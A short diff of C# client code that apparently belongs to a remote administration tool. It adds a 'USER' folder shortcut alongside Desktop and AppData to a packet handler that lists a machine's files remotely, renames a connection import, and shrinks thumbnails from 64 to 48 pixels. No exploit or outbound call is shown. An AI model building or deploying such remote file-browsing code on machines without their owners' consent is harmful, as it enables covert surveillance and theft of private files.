@@ -1,5 +1,5 @@
 ﻿using Client.MessagePack;
-using Client.Sockets;
+using Client.Connection;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
@@ -175,6 +175,7 @@ namespace Client.Handle_Packet
 
                 if (path == "DESKTOP") path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                 if (path == "APPDATA") path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData");
+                if (path == "USER") path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 
                 foreach (string folder in Directory.GetDirectories(path))
                 {
@@ -208,7 +209,7 @@ namespace Client.Handle_Packet
                 {
                     using (Bitmap myBitmap = new Bitmap(file))
                     {
-                        return new Bitmap(myBitmap.GetThumbnailImage(64, 64, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
+                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
                     }
                 }
                 else
@@ -219,7 +220,7 @@ namespace Client.Handle_Packet
             }
             catch
             {
-                return new Bitmap(64, 64);
+                return new Bitmap(48, 48);
             }
         }
 
